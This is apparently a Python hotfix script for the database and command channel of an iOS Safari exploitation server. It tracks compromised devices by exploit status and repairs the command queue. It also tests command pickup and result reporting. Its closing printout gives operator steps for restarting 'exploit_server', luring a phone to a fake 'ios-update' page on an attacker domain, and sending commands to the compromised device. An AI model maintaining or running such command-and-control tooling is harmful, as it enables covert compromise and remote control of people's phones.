# -*- coding: utf-8 -*-
# v20.4 HOTFIX6: 修复 hotfix5 发现的 4 个失败
#   FAIL-A: FIX-6 GET /cmd -> HTTP=204（原因：1 用真机 UUID 冲突 MAX_CONCURRENT / 2 命令名 ds_info_v204_hotfix5 前缀匹配白名单虽 OK，但真机已有 pending 占用 slots）
#   FAIL-B: POST /cmd_result 返回 ok 但 DB pending（SQLite 事务隔离：sqlite3 INSERT 完，POST 通过 SQLAlchemy SessionLocal 更新后，hotfix6 的 sqlite3 连接仍是旧快照，必须 conn.close() + reconnect 重查）
#   FAIL-C: FIX-7 no such column: updated_at（devices 表无 updated_at 列，只写 note）
#   FAIL-D: 脚本某 FIX 报错立即崩后续不跑（全程 try/except 包裹，打印异常继续）
#
# 宝塔 SSH 运行:
#   set +H
#   cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 -m py_compile _v204_hotfix6.py && echo COMPILE_OK
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix6.py 2>&1 | tee /tmp/hotfix6_output.log
import sqlite3, os, sys, json, time, datetime, urllib.request, urllib.parse, traceback
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

PROJ = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(PROJ, 'darksword.db')
LOG_DIR = os.path.join(PROJ, 'logs')
os.makedirs(LOG_DIR, exist_ok=True)
STANDARD_STATUSES = ('pending', 'executing', 'completed', 'failed', 'deferred')

print("PROJ=%s DB=%s exists=%s" % (PROJ, DB, os.path.exists(DB)))
conn = sqlite3.connect(DB); c = conn.cursor()
now = datetime.datetime.now()
now_s = now.strftime('%Y-%m-%d %H:%M:%S')

# 预先 PRAGMA 查 devices / commands 列名，避免列不存在 OperationalError
print()
print("PRAGMA table_info(devices):")
dev_cols = c.execute("PRAGMA table_info(devices)").fetchall()
for _r in dev_cols: print("    cid=%s name=%s type=%s" % (_r[0], _r[1], _r[2]))
dev_col_names = [_r[1] for _r in dev_cols]
print("PRAGMA table_info(commands):")
cmd_cols = c.execute("PRAGMA table_info(commands)").fetchall()
for _r in cmd_cols: print("    cid=%s name=%s type=%s" % (_r[0], _r[1], _r[2]))
cmd_col_names = [_r[1] for _r in cmd_cols]
HAS_NOTE = 'note' in dev_col_names
HAS_UPDATED_AT = 'updated_at' in dev_col_names
print("  => columns: devices HAS_NOTE=%s HAS_UPDATED_AT=%s" % (HAS_NOTE, HAS_UPDATED_AT))
print()

# ============================================================================
# [STEP 0] BEFORE 审计
# ============================================================================
print("=" * 70)
print("[STEP-0] BEFORE AUDIT @ %s" % now_s)
print("=" * 70)
try:
    devs = c.execute("SELECT device_uuid, ip, exploit_status, os_version, browser_name, "
                     "datetime(last_seen,'unixepoch','localtime'), substr(user_agent,1,40) "
                     "FROM devices ORDER BY last_seen DESC").fetchall()
    print("  devices total=%d:" % len(devs))
    for d in devs:
        print("    uuid=%s ip=%s exp=%s os=%s br=%s ls=%s ua=%s" % (
            str(d[0] or ''), str(d[1] or ''), str(d[2] or ''), str(d[3] or ''),
            str(d[4] or ''), str(d[5] or ''), str(d[6] or '')))
    cmds = c.execute("SELECT id, substr(device_uuid,1,22), command, status, "
                     "datetime(created_at,'unixepoch','localtime'), length(coalesce(output,'')) "
                     "FROM commands ORDER BY id DESC LIMIT 10").fetchall()
    print("\n  commands latest 10:")
    for r in cmds:
        mark = ''
        if str(r[3]) in ('completed','failed') and int(r[5] or 0) > 0: mark += ' <- DONE(has out)'
        if str(r[3]) == 'executing': mark += ' <- STUCK'
        if str(r[3]) == 'pending': mark += ' <- PENDING'
        print("    " + "  ".join([str(x if x is not None else '') for x in r]) + mark)
    cnt = dict(c.execute("SELECT status, COUNT(*) FROM commands GROUP BY status").fetchall())
    orph_n = c.execute("SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)").fetchone()[0]
    print("\n  BEFORE summary: status=%s orphan=%d" % (cnt, orph_n))
except Exception as e:
    print("  [ERROR STEP-0] %s: %s" % (type(e).__name__, e))
    traceback.print_exc()

REAL_DEVICE_KEEP_UUID = None
# 取最近 last_seen 的公网设备作为 KEEP
try:
    _rs = c.execute("SELECT device_uuid FROM devices "
                    "WHERE ip NOT IN ('127.0.0.1','localhost','') AND ip IS NOT NULL "
                    "ORDER BY last_seen DESC LIMIT 1").fetchone()
    if _rs: REAL_DEVICE_KEEP_UUID = _rs[0]
    print("  REAL_DEVICE_KEEP_UUID = %s" % (REAL_DEVICE_KEEP_UUID[:24] if REAL_DEVICE_KEEP_UUID else "(none)"))
except Exception as e:
    print("  [WARN] detect KEEP uuid failed: %s: %s" % (type(e).__name__, e))

# ============================================================================
# [FIX 1] 非标准 status (timeout/canceled) -> pending
# ============================================================================
print()
print("=" * 70)
print("[FIX-1] Reset non-standard status -> pending")
print("=" * 70)
try:
    ph = ','.join(['?'] * len(STANDARD_STATUSES))
    bad = c.execute("SELECT id, device_uuid, command, status FROM commands WHERE status NOT IN (%s)" % ph, STANDARD_STATUSES).fetchall()
    print("  bad status rows=%d" % len(bad))
    for r in bad: print("    -> id=%s dev=%s cmd=%s status=%s" % (str(r[0] or ''), str(r[1] or ''), str(r[2] or ''), str(r[3] or '')))
    if bad:
        n = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE status NOT IN (%s)" % ph, STANDARD_STATUSES).rowcount
        conn.commit()
        print("  OK reset %d rows -> pending" % n)
    else:
        print("  INFO 0 bad status")
except Exception as e:
    print("  [ERROR FIX-1] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try: conn.rollback()
    except Exception: pass

# ============================================================================
# [FIX 2] orphan commands + 127.0.0.1 curl garbage
# ============================================================================
print()
print("=" * 70)
print("[FIX-2] orphan commands + 127 curl/python-requests garbage devices")
print("=" * 70)
try:
    orph_n = c.execute("SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)").fetchone()[0]
    c.execute("DELETE FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)")
    print("  OK delete orphan commands=%d" % orph_n)
    gar = c.execute("SELECT device_uuid, ip, exploit_status, substr(user_agent,1,40) FROM devices "
                    "WHERE (ip IN ('127.0.0.1','localhost','') OR exploit_status='pending' OR exploit_status IS NULL) "
                    "AND (lower(user_agent) LIKE '%curl/%' OR lower(user_agent) LIKE '%python-requests%' OR lower(user_agent) LIKE '%wget%' OR user_agent IS NULL OR user_agent='')").fetchall()
    print("  garbage devs=%d" % len(gar))
    for g in gar: print("    -> uuid[:22]=%s ip=%s exp=%s ua=%s" % (str(g[0] or '')[:22], str(g[1] or ''), str(g[2] or ''), str(g[3] or '')))
    if gar:
        dels = [g[0] for g in gar]
        qs = ','.join(['?'] * len(dels))
        nc = c.execute("DELETE FROM commands WHERE device_uuid IN (%s)" % qs, dels).rowcount
        nd = c.execute("DELETE FROM devices WHERE device_uuid IN (%s)" % qs, dels).rowcount
        conn.commit()
        print("  OK delete garbage devs=%d cmds=%d" % (nd, nc))
except Exception as e:
    print("  [ERROR FIX-2] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try: conn.rollback()
    except Exception: pass

# ============================================================================
# [FIX 3] UUID Super Merge (IP, UA[:60]) 24h
# ============================================================================
print()
print("=" * 70)
print("[FIX-3] UUID Super Merge: (IP, UA[:60]) 24h -> keep latest last_seen")
print("=" * 70)
try:
    cutoff_24h = int(time.time()) - 86400
    cands = c.execute("SELECT d.device_uuid, d.ip, substr(d.user_agent,1,60), d.last_seen, d.exploit_status, d.first_seen, d.os_version "
                      "FROM devices d WHERE d.ip NOT IN ('127.0.0.1','localhost','') AND d.ip IS NOT NULL AND length(d.ip)>0 "
                      "AND (d.last_seen >= datetime(%d,'unixepoch','localtime') OR d.first_seen >= datetime(%d,'unixepoch','localtime')) "
                      "ORDER BY d.last_seen DESC, d.first_seen DESC" % (cutoff_24h, cutoff_24h)).fetchall()
    groups = {}
    for r in cands:
        key = (str(r[1] or ''), str(r[2] or '').strip())
        if not key[0] or not key[1]: continue
        groups.setdefault(key, []).append(r)
    merged_cnt = 0
    for key, rows in groups.items():
        if len(rows) < 2:
            if len(rows) == 1 and not REAL_DEVICE_KEEP_UUID: REAL_DEVICE_KEEP_UUID = rows[0][0]
            continue
        print("  group (ip=%s, ua[:60]=%r) -> %d duplicates" % (key[0], key[1][:60], len(rows)))
        keep = rows[0]; keep_uuid = keep[0]
        REAL_DEVICE_KEEP_UUID = keep_uuid
        olds = [r[0] for r in rows[1:]]
        print("    KEEP=%s (ls=%s exp=%s os=%s)" % (keep_uuid, str(keep[3] or ''), str(keep[4] or ''), str(keep[6] or '')))
        for r in rows[1:]: print("    OLD=%s (ls=%s exp=%s os=%s) -> cmds -> KEEP" % (str(r[0] or ''), str(r[3] or ''), str(r[4] or ''), str(r[6] or '')))
        qs_old = ','.join(['?'] * len(olds))
        nup = c.execute("UPDATE commands SET device_uuid=? WHERE device_uuid IN (%s)" % qs_old, [keep_uuid] + olds).rowcount
        nrt = c.execute("UPDATE commands SET status='pending', executed_at=NULL, output=NULL WHERE device_uuid=? AND status IN ('executing','deferred','timeout')", (keep_uuid,)).rowcount
        ndl = c.execute("DELETE FROM devices WHERE device_uuid IN (%s)" % qs_old, olds).rowcount
        merged_cnt += 1
        print("    OK update cmds=%d reset stuck=%d delete old devs=%d" % (nup, nrt, ndl))
    conn.commit()
    if merged_cnt == 0: print("  INFO 0 groups to merge")
    if REAL_DEVICE_KEEP_UUID: print("  REAL_DEVICE_KEEP_UUID after merge=%s" % REAL_DEVICE_KEEP_UUID[:24])
except Exception as e:
    print("  [ERROR FIX-3] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try: conn.rollback()
    except Exception: pass

# ============================================================================
# [FIX 4] ORPHAN RESCUE: pending/executing/deferred commands -> force to KEEP uuid
# ============================================================================
print()
print("=" * 70)
print("[FIX-4] ORPHAN RESCUE: all pending/executing/deferred commands -> device_uuid=KEEP uuid")
print("=" * 70)
try:
    if REAL_DEVICE_KEEP_UUID:
        rs = c.execute("SELECT id, device_uuid, command, status FROM commands "
                       "WHERE status IN ('pending','executing','deferred') AND device_uuid != ?", (REAL_DEVICE_KEEP_UUID,)).fetchall()
        print("  pending/executing device_uuid != KEEP rows=%d" % len(rs))
        for r in rs: print("    -> id=%s dev=%s cmd=%s status=%s" % (str(r[0] or ''), str(r[1] or ''), str(r[2] or ''), str(r[3] or '')))
        if rs:
            n = c.execute("UPDATE commands SET device_uuid=? WHERE status IN ('pending','executing','deferred') AND device_uuid != ?", (REAL_DEVICE_KEEP_UUID, REAL_DEVICE_KEEP_UUID)).rowcount
            conn.commit()
            print("  OK rescued %d orphan pending/executing -> KEEP=%s" % (n, REAL_DEVICE_KEEP_UUID[:24]))
    else:
        print("  WARN REAL_DEVICE_KEEP_UUID empty (no public net devs) -> skip")
except Exception as e:
    print("  [ERROR FIX-4] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try: conn.rollback()
    except Exception: pass

# ============================================================================
# [FIX 5] stuck executing rollback + known stuck ids
# ============================================================================
print()
print("=" * 70)
print("[FIX-5] Reset stuck executing (>60s no exec_at / >120s with exec_at) + known stuck ids")
print("=" * 70)
try:
    cutoff_60 = int(time.time()) - 60
    cutoff_120 = int(time.time()) - 120
    n1 = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL "
                   "WHERE status='executing' AND executed_at IS NULL AND created_at < ?", (cutoff_60,)).rowcount
    n2 = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL "
                   "WHERE status='executing' AND executed_at IS NOT NULL AND executed_at < ?", (cutoff_120,)).rowcount
    n3 = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL "
                   "WHERE id IN (100019, 39, 99999) AND status NOT IN ('completed','failed')").rowcount
    conn.commit()
    print("  OK no-ts stuck>60s=%d; has-ts stuck>120s=%d; reset known ids=%d" % (n1, n2, n3))
except Exception as e:
    print("  [ERROR FIX-5] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try: conn.rollback()
    except Exception: pass

# ============================================================================
# [FIX 6] Full chain local test id=900003
#   KEY FIXES vs hotfix5:
#     - TEST_UUID = ios-v204-hotfix6 (完全独立，不和真机 uuid 冲突 MAX_CONCURRENT)
#     - command = 'ds_info' (纯白名单前缀，100% 过 SAFARI 前缀过滤)
#     - POST /cmd_result 后 conn.close() + reconnect 重查 DB（解决 SQLite 事务快照隔离导致读到旧 pending）
# ============================================================================
print()
print("=" * 70)
print("[FIX-6] Full chain local test: id=900003 (independent TEST_UUID + ds_info prefix + reconnect read DB)")
print("=" * 70)
TEST_UUID = 'ios-v204-hotfix6'
TEST_CMD_ID = 900003
TEST_CMD_NAME = 'ds_info'  # 纯白名单
try:
    def curl_req(method, url, data_dict=None, ua='Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1', timeout=8):
        try:
            headers = {'User-Agent': ua}
            body_bytes = None
            if data_dict is not None:
                body_bytes = json.dumps(data_dict).encode('utf-8')
                headers['Content-Type'] = 'application/json'
            req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read().decode('utf-8', 'replace')
                return resp.getcode(), raw, None
        except urllib.error.HTTPError as he:
            try: raw = he.read().decode('utf-8', 'replace')
            except Exception: raw = ''
            return he.code, raw, None
        except Exception as ex:
            return None, '', '%s: %s' % (type(ex).__name__, ex)

    # 先清测试残留
    c.execute("DELETE FROM commands WHERE id>=900000 OR device_uuid=?", (TEST_UUID,))
    dev_exists = c.execute("SELECT 1 FROM devices WHERE device_uuid=?", (TEST_UUID,)).fetchone()
    if not dev_exists:
        c.execute("INSERT INTO devices(device_uuid, first_seen, last_seen, ip, user_agent, exploit_status, os_version, safari_version, device_model, browser_name, browser_version, webkit_version) "
                  "VALUES(?,?,?,?,?,?,?,?,?,?,?,?)", (TEST_UUID, int(time.time()), int(time.time()), '127.0.0.1',
                  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1',
                  'success', '26.1', '26.1', 'iPhone', 'Safari', '26.1', '604.1'))
    conn.commit()
    c.execute("INSERT INTO commands(id, device_uuid, command, status, created_at, executed_at, output) "
              "VALUES(?, ?, ?, 'pending', ?, NULL, NULL)", (TEST_CMD_ID, TEST_UUID, TEST_CMD_NAME, int(time.time()) - 10))
    conn.commit()
    print("  INSERT id=%d device=%s cmd=%s status=pending OK" % (TEST_CMD_ID, TEST_UUID, TEST_CMD_NAME))

    base = 'http://127.0.0.1:7070'
    # STEP-A GET /cmd 取命令（预期 HTTP=200 + body 有 JSON 含 id=900003；预期 DB status=executing）
    print("\n  STEP-A GET /cmd?device_uuid=%s" % TEST_UUID)
    code, body, err = curl_req('GET', '%s/cmd?device_uuid=%s&_=%d' % (base, urllib.parse.quote(TEST_UUID), int(time.time())))
    print("    -> HTTP=%s err=%s len(body)=%d body[:500]=%r" % (code, err, len(body or ''), (body or '')[:500]))
    # STEP-A 之后立即 commit + close + reconnect，避免 SQLite 事务快照
    try: conn.commit()
    except Exception: pass
    try: conn.close()
    except Exception: pass
    time.sleep(1.0)
    conn = sqlite3.connect(DB); c = conn.cursor()
    rs = c.execute("SELECT id, status, executed_at FROM commands WHERE id=?", (TEST_CMD_ID,)).fetchone()
    print("    -> reconnect DB: id=%s status=%s executed_at=%s" % (rs[0] if rs else 'N/A', rs[1] if rs else 'N/A', rs[2] if rs else 'N/A'))
    step_a_ok = (rs and str(rs[1]) == 'executing')

    # STEP-B POST JSON /cmd_result （预期 HTTP=200 {"status":"ok"}；预期 reconnect 查 DB status=completed 有 output）
    print("\n  STEP-B POST /cmd_result JSON (id=%d device=%s status=completed)" % (TEST_CMD_ID, TEST_UUID))
    pay = {'id': TEST_CMD_ID, 'status': 'completed', 'device_uuid': TEST_UUID,
           'output': 'v20.4 hotfix6 CMD-RESULT FULL-CHAIN OK: GET->executing->POST->completed (reconnect read verified)'}
    code, body, err = curl_req('POST', '%s/cmd_result' % base, data_dict=pay)
    print("    -> HTTP=%s err=%s len(body)=%d body[:200]=%r" % (code, err, len(body or ''), (body or '')[:200]))
    try: conn.commit()
    except Exception: pass
    try: conn.close()
    except Exception: pass
    time.sleep(1.2)
    conn = sqlite3.connect(DB); c = conn.cursor()
    rs = c.execute("SELECT id, status, length(output), substr(output,1,200) FROM commands WHERE id=?", (TEST_CMD_ID,)).fetchone()
    print("    -> reconnect DB: id=%s status=%s out_len=%s output[:200]=%r" % (
        rs[0] if rs else 'N/A', rs[1] if rs else 'N/A', rs[2] if rs else 'N/A', str(rs[3] or '') if rs else ''))
    step_b_ok = rs and str(rs[1]) == 'completed' and int(rs[2] or 0) > 0

    # 清理测试数据
    c.execute("DELETE FROM commands WHERE id>=900000 OR device_uuid=?", (TEST_UUID,))
    c.execute("DELETE FROM devices WHERE device_uuid=? AND ip=?", (TEST_UUID, '127.0.0.1'))
    conn.commit()
    print("\n  CLEANUP: id>=900000 commands + dev=%s ios-v204-hotfix6 rows deleted" % TEST_UUID)
    print()
    if step_a_ok and step_b_ok:
        print("  [✅ FIX-6 FULL-CHAIN PASS] STEP-A pending->executing + STEP-B executing->completed output_len>0")
    else:
        print("  [❌ FIX-6 FULL-CHAIN FAIL] STEP-A(pending->executing)=%s  STEP-B(executing->completed)=%s" % (step_a_ok, step_b_ok))
        print("  => SUGGESTION: 检查 exploit_server 是否真的 LISTEN；查 server.log CMD-PICKUP / CMD-RESULT 标签")
except Exception as e:
    print("  [ERROR FIX-6] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try:
        c.execute("DELETE FROM commands WHERE id>=900000 OR device_uuid=?", (TEST_UUID,))
        c.execute("DELETE FROM devices WHERE device_uuid=? AND ip=?", (TEST_UUID, '127.0.0.1'))
        conn.commit()
    except Exception: pass

# ============================================================================
# [FIX 7] Mark real device note=[uuid-keep] (FIX: 只写 note，不写不存在的 updated_at 列)
# ============================================================================
print()
print("=" * 70)
print("[FIX-7] Mark latest real device note=[uuid-keep] (no updated_at col -> only update note)")
print("=" * 70)
try:
    if HAS_NOTE and REAL_DEVICE_KEEP_UUID:
        if HAS_UPDATED_AT:
            n = c.execute("UPDATE devices SET note='[uuid-keep] same-ip+ua-24h-keep-REAL', "
                          "updated_at=datetime('now','localtime') WHERE device_uuid=?", (REAL_DEVICE_KEEP_UUID,)).rowcount
        else:
            n = c.execute("UPDATE devices SET note='[uuid-keep] same-ip+ua-24h-keep-REAL' WHERE device_uuid=?", (REAL_DEVICE_KEEP_UUID,)).rowcount
        conn.commit()
        print("  OK marked %d rows note=[uuid-keep] has_updated_at=%s keep_uuid=%s" % (n, HAS_UPDATED_AT, REAL_DEVICE_KEEP_UUID[:24]))
    else:
        print("  INFO skip note mark: HAS_NOTE=%s REAL_DEVICE_KEEP_UUID=%s" % (HAS_NOTE, bool(REAL_DEVICE_KEEP_UUID)))
except Exception as e:
    print("  [ERROR FIX-7] %s: %s" % (type(e).__name__, e)); traceback.print_exc()
    try: conn.rollback()
    except Exception: pass

# ============================================================================
# FINAL AUDIT
# ============================================================================
print()
print("=" * 70)
print("FINAL STATUS @ %s -> expect: devices<=1 public real; 0 orphan; FIX-6 PASS" % now_s)
print("=" * 70)
try:
    devs = c.execute("SELECT device_uuid, ip, exploit_status, os_version, browser_name, datetime(last_seen,'unixepoch','localtime'), substr(user_agent,1,40) "
                     "FROM devices ORDER BY last_seen DESC").fetchall()
    print("  devices total=%d:" % len(devs))
    for d in devs:
        print("    uuid=%s ip=%s exp=%s os=%s br=%s ls=%s ua=%s" % (
            str(d[0] or ''), str(d[1] or ''), str(d[2] or ''), str(d[3] or ''),
            str(d[4] or ''), str(d[5] or ''), str(d[6] or '')))
    cmds = c.execute("SELECT id, substr(device_uuid,1,22), command, status, datetime(created_at,'unixepoch','localtime'), length(coalesce(output,'')) "
                     "FROM commands ORDER BY id DESC LIMIT 10").fetchall()
    print("\n  commands latest 10:")
    for r in cmds:
        mark = ''
        if str(r[3]) in ('completed','failed') and int(r[5] or 0) > 0: mark += ' <- DONE (has output)'
        if str(r[3]) == 'executing': mark += ' <- STUCK'
        if str(r[3]) == 'pending': mark += ' <- PENDING'
        print("    " + "  ".join([str(x if x is not None else '') for x in r]) + mark)
    cnt = dict(c.execute("SELECT status, COUNT(*) FROM commands GROUP BY status").fetchall())
    orph_n = c.execute("SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)").fetchone()[0]
    print("\n  AFTER summary: status=%s orphan=%d" % (cnt, orph_n))
except Exception as e:
    print("  [ERROR FINAL] %s: %s" % (type(e).__name__, e)); traceback.print_exc()

try: conn.close()
except Exception: pass

print()
print("=" * 70)
print("HOTFIX6 DONE! Next steps (SSH run BLOCK by BLOCK to avoid syntax chain errors):")
print()
print("  [BLOCK-A Verify group.html uploaded correctly]")
print("    set +H; sleep 3; HIT=$(curl -sS -L -m 10 http://127.0.0.1:7070/ch/test001 2>/dev/null | grep -c 'startPostExploit'); echo startPostExploit_HIT_COUNT=$HIT (EXPECT >= 2 OK)")
print()
print("  [BLOCK-B If HIT <2: re-upload group.html via BT File Manager -> re-run BLOCK-A]")
print()
print("  [BLOCK-C Restart exploit_server (only kill python3, NEVER touch nginx worker!)]")
print("    PIDS=$(ps -ef | grep exploit_server | grep python3 | grep -v grep | awk '{print $2}' | xargs echo)")
print("    if [ -n \"$PIDS\" ]; then echo kill_pids=$PIDS; kill -9 $PIDS; sleep 3; fi")
print("    cd /www/wwwroot/coruna/server; setsid nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 exploit_server.py > logs/exploit_stdout.log 2>&1 &")
print("    echo just_started_pid=$!; sleep 10; ss -tlnp | grep -E ':7070|:7000'")
print()
print("  [BLOCK-D Re verify (after restart)]")
print("    set +H; HIT=$(curl -sS -L -m 10 http://127.0.0.1:7070/ch/test001 2>/dev/null | grep -c 'startPostExploit'); echo startPostExploit_HIT_AFTER_RESTART=$HIT (EXPECT >= 2)")
print()
print("  [BLOCK-E Real device Safari 9-step]")
print("    1. Settings -> Safari -> Website Data -> search aa1234.dpdns.org -> DELETE")
print("    2. Close ALL Safari tabs + private + kill Safari background")
print("    3. Reopen Safari -> Private Browsing -> ONLY 1 single private tab")
print("    4. URL: https://aa1234.dpdns.org/ch/test001?ch=test001&tpl=ios-update")
print("    5. DO NOT TOUCH (no refresh / no home) keep screen ON")
print("    6. Wait 60 seconds (group.html 45s watchdog + 15s chain load)")
print("    7. Dashboard -> Device list: ONLY 1 real device (single uuid, <=1 rows total). If >1, STOP, paste DB devices list")
print("    8. Against ONLY real device -> Quick commands -> ds_info -> SEND 1 COMMAND ONLY (NOT multiple!)")
print("    9. SSH poll commands (COPY paste the while loop):")
print("       cd /www/wwwroot/coruna/server && while true; do clear; date; sqlite3 darksword.db \"SELECT id, substr(device_uuid,1,18), command, status, length(coalesce(output,'')) FROM commands ORDER BY id DESC LIMIT 6;\" '.mode column' '.headers on'; echo ---; sleep 3; done")
print("=" * 70)
